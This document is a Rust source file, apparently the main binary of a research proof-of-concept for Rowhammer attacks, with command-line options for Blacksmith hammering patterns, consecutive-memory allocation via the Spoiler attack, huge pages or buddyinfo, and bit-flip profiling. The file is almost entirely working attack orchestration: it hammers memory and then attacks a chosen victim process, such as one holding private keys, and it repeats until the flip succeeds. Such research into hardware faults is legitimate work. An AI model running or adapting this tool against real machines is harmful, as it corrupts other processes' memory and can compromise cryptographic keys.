use std::{
    fmt::Debug,
    fs::File,
    io::{stdin, BufReader, BufWriter, Write},
    ops::Range,
    time::Duration,
};

use anyhow::bail;
use bs_poc::hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper};
use bs_poc::hammerer::Hammering;
use bs_poc::memory::mem_configuration::MemConfiguration;
use bs_poc::{
    allocator,
    allocator::{BuddyInfo, ConsecAlloc, ConsecAllocator, Mmap},
    hammerer,
    memory::ConsecCheck,
    victim,
};
use bs_poc::{allocator::hugepage::HugepageAllocator, memory::BitFlip};
use bs_poc::{
    allocator::{CoCo, HugepageRandomized, Spoiler},
    hammerer::Hammerer,
};
use bs_poc::{hammerer::blacksmith::blacksmith_config::BlacksmithConfig, victim::HammerVictim};
use bs_poc::{
    memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming, ConsecCheckNone, ConsecCheckPfn},
    retry,
    util::init_logging_with_progress,
};
use clap::Parser;
use indicatif::{MultiProgress, ProgressBar};
use log::{info, warn};
use serde::Serialize;

/// CLI arguments for the `hammer` binary.
///
/// This struct defines the command line arguments that can be passed to the `hammer` binary.
#[derive(Debug, Parser)]
struct CliArgs {
    ///The `blacksmith` config file.
    #[clap(long = "config", default_value = "config/bs-config.json")]
    config: String,
    /// The JSON file containing hammering patterns to load.
    #[clap(long = "load-json", default_value = "config/fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the `blacksmith` JSON file.
    #[clap(
        long = "pattern",
        default_value = "39ad622b-3bfe-4161-b860-dad5f3e6dd68"
    )]
    pattern: Option<String>,
    /// The mapping ID to load from the `blacksmith` JSON file. Optional argument, will determine most optimal pattern if omitted.
    #[clap(long = "mapping")]
    mapping: Option<String>,
    /// Some allocation strategies require a check for consecutive memory. This option allows you to specify the type of check to use.
    #[clap(long = "consec-check", default_value = "bank-timing")]
    consec_check: ConsecCheckType,
    /// The allocation strategy to use.
    #[clap(long = "alloc-strategy", default_value = "spoiler")]
    alloc_strategy: AllocStrategy,
    /// The hammering strategy to use.
    #[clap(long = "hammerer", default_value = "blacksmith")]
    hammerer: HammerStrategy,
    /// Repeat the hammering until the target reports a successful attack. If --repeat is specified without a value, the hammering will
    /// repeat indefinitely. The victim process is restarted for each repetition. The default is to repeat the hammering once and exit even if the attack was not successful.
    /// A repetition denotes a complete run of the suite:
    /// 1. allocate memory using the requested `alloc-strategy`
    /// 2. initialize the victim, potentially running a memory massaging technique to inject a target page
    /// 3. run the hammer attack using the requested `hammerer` for a number of `rounds`
    /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
    #[arg(long)]
    repeat: Option<Option<usize>>,
    /// The number of rounds to profile for vulnerable addresses.
    /// A round denotes a run of a given hammerer, potentially with multiple attempts at hammering the target.
    #[arg(long, default_value = "10")]
    profiling_rounds: u64,
    /// The number of rounds to hammer per repetition.
    /// A round denotes a run of a given hammerer, potentially with multiple attempts at hammering the target.
    /// At the start of a round, the victim is initialized. The concrete intialization depends on the victim implementation. For example, a MemCheck
    /// victim will initialize the memory with a random seed, while a process victim might generate a new private key for each round.
    #[arg(long, default_value = "1")]
    rounds: u64,
    /// The number of hammering attempts per round.
    /// An attempt denotes a single run of the hammering code. Usually, hammerers need several attempts to successfully flip a bit in the victim.
    /// The default value of 100 is a good starting point for the blacksmith hammerer.
    #[arg(long, default_value = "20")]
    attempts: u8,
    /// Do a stats run. This will run the hammerer and store the results in the provided file. The default is `None`, causing no stats to be stored.
    /// When `stats` is set, the hammering process will not exit after the first successful attack, but continue hammering until `repeat` is reached.
    #[arg(long)]
    statistics: Option<String>,
    /// The target binary to hammer. This is the binary that will be executed and communicated with via IPC. See `victim` module for more details.
    target: Vec<String>,
}

/// The hammering strategy to use.
#[derive(clap::ValueEnum, Clone, Debug)]
pub enum HammerStrategy {
    /// Use a dummy hammerer. This hammerer flips a bit at a fixed offset.
    Dummy,
    /// Use the blacksmith hammerer. This hammerer uses the pattern and mapping determined by `blacksmith` to hammer the target.
    Blacksmith,
}

/// The type of consecutive memory check to use.
#[derive(clap::ValueEnum, Clone, Debug)]
pub enum ConsecCheckType {
    /// Measure consecutive memory accesses using bank timing. This will check the allocation against the memory configuration to determine if it is consecutive.
    BankTiming,
    /// No consecutive memory check.
    None,
    /// Check for consecutive memory accesses using page frame numbers (requires root). Mainly used for debugging, as it assumes a very powerful thread model.
    Pfn,
}

/// The type of allocation strategy to use.
#[derive(clap::ValueEnum, Clone, Debug)]
pub enum AllocStrategy {
    /// Use `/proc/buddyinfo` to monitor availability of page orders, assume consecutive memory according to the delta in buddyinfo.
    BuddyInfo,
    // Allocate using the CoCo dec mem module: https://git.its.uni-luebeck.de/research-projects/tdx/kmod-coco-dec-mem
    CoCo,
    /// Allocate consecutive memory using huge pages.
    Hugepage,
    /// Allocate consecutive memory using huge pages with randomization. This will return random 4 MB chunks of a 1 GB hugepage.
    HugepageRnd,
    /// Allocate consecutive memory using `mmap`. This will `mmap` a large buffer and find consecutive memory using the provided `ConsecCheckType`
    Mmap,
    /// Allocate consecutive memory using the Spoiler attack. This strategy will measure read-after-write pipeline conflicts to determine consecutive memory.
    Spoiler,
}

impl AllocStrategy {
    fn create_allocator(
        &self,
        consec_checker: ConsecCheck,
        mem_config: MemConfiguration,
        conflict_threshold: u64,
        progress: Option<MultiProgress>,
    ) -> allocator::ConsecAlloc {
        match self {
            AllocStrategy::BuddyInfo => ConsecAlloc::BuddyInfo(BuddyInfo::new(consec_checker)),
            AllocStrategy::CoCo => ConsecAlloc::CoCo(CoCo {}),
            AllocStrategy::Mmap => ConsecAlloc::Mmap(Mmap::new(consec_checker, progress)),
            AllocStrategy::Hugepage => ConsecAlloc::Hugepage(HugepageAllocator::default()),
            AllocStrategy::HugepageRnd => ConsecAlloc::HugepageRnd(HugepageRandomized::new(1)),
            AllocStrategy::Spoiler => ConsecAlloc::Spoiler(Box::new(Spoiler::new(
                mem_config,
                conflict_threshold,
                progress,
            ))),
        }
    }
}

fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
    let f = File::open(&json_filename)?;
    let reader = BufReader::new(f);
    let fuzz: FuzzSummary = serde_json::from_reader(reader)?;
    let pattern = retry!(|| {
        println!("Please choose a pattern:");
        for (i, pattern) in fuzz.hammering_patterns.iter().enumerate() {
            let best_mapping = pattern
                .determine_most_effective_mapping()
                .expect("no mappings");
            println!(
                "{}: {} (best mapping {} with {} flips)",
                i,
                pattern.id,
                best_mapping.id,
                best_mapping.count_bitflips()
            )
        }
        let mut option = String::new();
        stdin()
            .read_line(&mut option)
            .expect("Did not enter a correct string");
        match str::parse::<usize>(option.trim()) {
            Ok(i) => {
                if i < fuzz.hammering_patterns.len() {
                    return Ok(fuzz.hammering_patterns[i].id.clone());
                }
                bail!(
                    "Invalid pattern index {}/{}",
                    i,
                    fuzz.hammering_patterns.len()
                );
            }
            Err(e) => Err(e.into()),
        }
    });
    Ok(pattern)
}

fn create_consec_checker_from_cli(
    consec_check: ConsecCheckType,
    mem_config: MemConfiguration,
    conflict_threshold: u64,
    progress: Option<MultiProgress>,
) -> anyhow::Result<ConsecCheck> {
    Ok(match consec_check {
        ConsecCheckType::None => ConsecCheck::None(ConsecCheckNone {}),
        ConsecCheckType::Pfn => ConsecCheck::Pfn(ConsecCheckPfn {}),
        ConsecCheckType::BankTiming => ConsecCheck::BankTiming(
            ConsecCheckBankTiming::new_with_progress(mem_config, conflict_threshold, progress),
        ),
    })
}

struct LoadedPattern {
    pattern: HammeringPattern,
    mapping: PatternAddressMapper,
}

fn load_pattern(args: &CliArgs) -> anyhow::Result<LoadedPattern> {
    // load patterns from JSON
    let pattern = match &args.pattern {
        Some(pattern) => pattern.clone(),
        None => cli_ask_pattern(args.load_json.clone())?,
    };

    let pattern = HammeringPattern::load_pattern_from_json(args.load_json.clone(), pattern)?;
    let mapping = match &args.mapping {
        Some(mapping) => pattern.find_mapping(mapping).expect("mapping not found"),
        None => pattern
            .determine_most_effective_mapping()
            .expect("pattern contains no mapping"),
    };

    info!("Using mapping {}", mapping.id);
    let max_flips = mapping.count_bitflips();
    info!("Max flips: {:?}", max_flips);
    if max_flips == 0 {
        bail!("No flips in mapping");
    }
    info!("Flips in mapping: {:?}", &mapping.bit_flips);
    Ok(LoadedPattern { pattern, mapping })
}

#[allow(clippy::too_many_arguments)]
fn make_hammer<'a>(
    hammerer: &HammerStrategy,
    pattern: &HammeringPattern,
    mapping: &PatternAddressMapper,
    mem_config: MemConfiguration,
    block_size: usize,
    memory: &'a ConsecBlocks,
    rounds: u64,
    attempts: u8,
) -> anyhow::Result<Hammerer<'a>> {
    let block_shift = block_size.ilog2();
    let hammerer: Hammerer<'a> = match hammerer {
        HammerStrategy::Blacksmith => Hammerer::Blacksmith(hammerer::Blacksmith::new(
            mem_config,
            pattern,
            mapping,
            block_shift as usize,
            memory,
            rounds,
            attempts,
        )?),
        HammerStrategy::Dummy => {
            let flip = mapping.get_bitflips_relocate(mem_config, block_shift as usize, memory);
            let flip = flip.concat().pop().unwrap_or(memory.blocks[0].addr(0x42)) as *mut u8;
            info!(
                "Running dummy hammerer with flip at VA 0x{:02x}",
                flip as usize
            );
            let hammerer = hammerer::Dummy::new(flip);
            Hammerer::Dummy(hammerer)
        }
    };
    Ok(hammerer)
}

#[derive(Debug)]
struct Profiling {
    bit_flips: Vec<Vec<BitFlip>>,
    durations: Vec<Duration>,
}

/// Hammer a given memory region a number of times to profile for vulnerable addresses.
fn hammer_profile(
    hammerer: &mut Hammerer,
    memory: &ConsecBlocks,
    rounds: u64,
    progress: Option<MultiProgress>,
) -> Profiling {
    let p = progress.as_ref().map(|p| p.add(ProgressBar::new(rounds)));
    let mut bit_flips = vec![];
    let mut durations = vec![];
    let mut victim = victim::MemCheck::new(memory);

    for _ in 0..rounds {
        if let Some(p) = p.as_ref() {
            p.inc(1)
        }
        let start = std::time::Instant::now();
        let result = hammerer.hammer(&mut victim);
        let duration = std::time::Instant::now() - start;
        durations.push(duration);
        match result {
            Ok(result) => {
                info!(
                    "Profiling hammering round successful: {:?}",
                    result.victim_result
                );
                bit_flips.push(result.victim_result);
            }
            Err(e) => {
                warn!("Profiling hammering round not successful: {:?}", e);
                bit_flips.push(vec![]);
            }
        }
    }
    Profiling {
        bit_flips,
        durations,
    }
}

unsafe fn _main() -> anyhow::Result<()> {
    let progress = init_logging_with_progress()?;

    // parse args
    let args = CliArgs::parse();
    let config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config = MemConfiguration::from_blacksmith(&config);
    let pattern = load_pattern(&args)?;

    let consec_checker = create_consec_checker_from_cli(
        args.consec_check,
        mem_config,
        config.threshold,
        Some(progress.clone()),
    )?;
    let mut alloc_strategy = args.alloc_strategy.create_allocator(
        consec_checker,
        mem_config,
        config.threshold,
        Some(progress.clone()),
    );
    let block_size = alloc_strategy.block_size();

    let repetitions = match args.repeat {
        Some(Some(repeat)) => repeat,
        Some(None) => usize::MAX,
        None => 1,
    };

    #[derive(Serialize)]
    struct HammerStatistic {
        alloc_duration_millis: u128,
        memory_regions: Vec<Range<u64>>,
        hammer_durations_millis: Vec<u128>,
        bit_flips: Vec<Vec<BitFlip>>,
    }
    let mut stats = vec![];
    for _ in 0..repetitions {
        info!("Starting bait allocation");
        let start = std::time::Instant::now();
        let memory = allocator::alloc_memory(&mut alloc_strategy, mem_config, &pattern.mapping)?;
        let alloc_duration = std::time::Instant::now() - start;
        info!("Allocated {} bytes of memory", memory.len());

        let mut hammer = make_hammer(
            &args.hammerer,
            &pattern.pattern,
            &pattern.mapping,
            mem_config,
            block_size,
            &memory,
            args.rounds,
            args.attempts,
        )?;
        info!("Profiling memory for vulnerable addresses");
        info!(
            "Expecting bitflips at {:?}",
            pattern
                .mapping
                .get_bitflips_relocate(mem_config, block_size.ilog2() as usize, &memory)
        );
        let profiling = hammer_profile(
            &mut hammer,
            &memory,
            args.profiling_rounds,
            Some(progress.clone()),
        );
        // write stats
        if let Some(stats_file) = &args.statistics {
            stats.push(HammerStatistic {
                alloc_duration_millis: alloc_duration.as_millis(),
                memory_regions: memory.consec_pfns().unwrap_or_default(),
                hammer_durations_millis: profiling
                    .durations
                    .iter()
                    .map(|d| d.as_millis())
                    .collect(),
                bit_flips: profiling.bit_flips.clone(),
            });
            info!(
                "Writing statistics to file {}",
                args.statistics.as_ref().unwrap()
            );
            let mut json_file = BufWriter::new(File::create(stats_file)?);
            serde_json::to_writer_pretty(&mut json_file, &stats)?;
            json_file.flush()?;
        }
        if profiling.bit_flips.is_empty() {
            warn!("No vulnerable addresses found");
            continue;
        } else {
            info!(
                "Profiling done. Found bitflips in {:?}",
                profiling.bit_flips
            );
        }

        // TODO use profiling results to determine the best addresses to inject into the victim

        let victim = if args.target.is_empty() {
            None
        } else {
            Some(victim::Process::new(&args.target)?)
        };
        match victim {
            Some(mut victim) => {
                let result = hammer.hammer(&mut victim);
                match result {
                    Ok(result) => {
                        info!("Hammering successful: {:?}", result.victim_result);
                    }
                    Err(e) => {
                        warn!("Hammering not successful: {:?}", e);
                    }
                }
                victim.stop();
            }
            None => {
                warn!("No target specified.");
            }
        }
        drop(hammer);
        memory.dealloc();
    }
    bail!(
        "Hammering was not successful after {} repetitions",
        repetitions
    );
}

fn main() -> anyhow::Result<()> {
    unsafe { _main() }
}
